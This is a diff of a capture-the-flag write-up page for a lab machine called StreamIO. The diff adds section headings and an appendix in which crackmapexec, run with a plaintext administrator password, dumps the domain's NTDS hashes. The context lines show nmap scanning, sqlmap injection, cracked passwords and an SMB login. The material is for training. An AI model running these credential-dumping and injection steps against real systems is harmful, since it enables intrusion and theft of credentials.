@@ -126,7 +126,8 @@
 
 
   <div>
-    <p>We have an IP, so we start with the usual, a simple port scan using nmap.</p>
+    <h1>Reconnaissance</h1>
+<p>We have an IP, so we start with the usual, a simple port scan using nmap.</p>
 <div class="highlight"><pre><span></span><code><span class="c1"># Nmap 7.80 scan initiated Wed Jun 15 08:35:18 2022 as: nmap -p - -T4 -sV -oA nmap_streamio 10.10.11.158</span>
 Nmap scan report <span class="k">for</span> streamio <span class="o">(</span><span class="m">10</span>.10.11.158<span class="o">)</span>
 Host is up <span class="o">(</span><span class="m">0</span>.026s latency<span class="o">)</span>.
@@ -299,6 +300,7 @@ Starting with the register.php endpoint. We can type in a username and a passwor
 <code>/admin/index.php</code> showed <strong>FORBIDDEN</strong>, but
 <code>admin/master.php</code> showed this</p>
 <p><img alt="register.php" src="/images/htb/streamio/streamio.htb_admin_master.php.PNG"></p>
+<h1>SQL Injection</h1>
 <p><code>watch.streamio.htb/search.php</code> didn't liked SQL injection tries and redirected to <code>blocked.php</code></p>
 <p><img alt="register.php" src="/images/htb/streamio/watch.streamio.htb_search_blocked.php.PNG"></p>
 <p>Let's see what <a href="https://github.com/sqlmapproject/sqlmap">sqlmap</a> can do for us. Trying all those found endpoints, I will show the results for <code>login.php</code></p>
@@ -444,6 +446,7 @@ yoshihide - b779ba15cedfd22a023c4d8bcf5f2332
 b779ba15cedfd22a023c4d8bcf5f2332    md5 66boysandgirls..
 </code></pre></div>
 
+<h1>Pivoting</h1>
 <p>Great both cracked, let's see if SMB login works.</p>
 <div class="highlight"><pre><span></span><code><span class="c1"># nikk37 worked</span>
 cme smb streamio.htb -u nikk37 -p <span class="s1">&#39;get_dem_girls2@yahoo.com&#39;</span>
@@ -726,6 +729,20 @@ f0873b557d5a24b8b77380938cb8623c
 </code></pre></div>
 
 <p>Done! Because we are nice, we run the <code>clearing.bat</code>, to reset the DACLs.</p>
+<h1>Appendix</h1>
+<div class="highlight"><pre><span></span><code>cme smb <span class="nv">$TIP</span> -u administrator -p <span class="s1">&#39;3W7Z4}$Wu2P0V/&#39;</span> --ntds
+SMB         <span class="m">10</span>.10.11.158    <span class="m">445</span>    DC               <span class="o">[</span>*<span class="o">]</span> Windows <span class="m">10</span>.0 Build <span class="m">17763</span> x64 <span class="o">(</span>name:DC<span class="o">)</span> <span class="o">(</span>domain:streamIO.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
+SMB         <span class="m">10</span>.10.11.158    <span class="m">445</span>    DC               <span class="o">[</span>+<span class="o">]</span> streamIO.htb<span class="se">\a</span>dministrator:3W7Z4<span class="o">}</span><span class="nv">$Wu2P0V</span>/ <span class="o">(</span>Pwn3d!<span class="o">)</span>
+SMB         <span class="m">10</span>.10.11.158    <span class="m">445</span>    DC               <span class="o">[</span>+<span class="o">]</span> Dumping the NTDS, this could take a <span class="k">while</span> so go grab a redbull...
+SMB         <span class="m">10</span>.10.11.158    <span class="m">445</span>    DC               Administrator:500:aad3b435b51404eeaad3b435b51404ee:eb8ddc2769f325862b883ff2dce33317:::
+SMB         <span class="m">10</span>.10.11.158    <span class="m">445</span>    DC               Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+SMB         <span class="m">10</span>.10.11.158    <span class="m">445</span>    DC               krbtgt:502:aad3b435b51404eeaad3b435b51404ee:5f5142aae3cce656285ce4504605dec1:::
+SMB         <span class="m">10</span>.10.11.158    <span class="m">445</span>    DC               JDgodd:1104:aad3b435b51404eeaad3b435b51404ee:8846130392c4169cb552fe5b73b046af:::
+SMB         <span class="m">10</span>.10.11.158    <span class="m">445</span>    DC               Martin:1105:aad3b435b51404eeaad3b435b51404ee:a9347432fb0034dd1814ca794793d377:::
+SMB         <span class="m">10</span>.10.11.158    <span class="m">445</span>    DC               nikk37:1106:aad3b435b51404eeaad3b435b51404ee:17a54d09dd09920420a6cb9b78534764:::
+SMB         <span class="m">10</span>.10.11.158    <span class="m">445</span>    DC               yoshihide:1107:aad3b435b51404eeaad3b435b51404ee:6d21f46be3697ba16b6edef7b3399bf4:::
+SMB         <span class="m">10</span>.10.11.158    <span class="m">445</span>    DC               DC$:1000:aad3b435b51404eeaad3b435b51404ee:5618d95a388132e93bf622d6a6b2e84a:::
+</code></pre></div>
   </div>
   <div class="tag-cloud">
     <p>
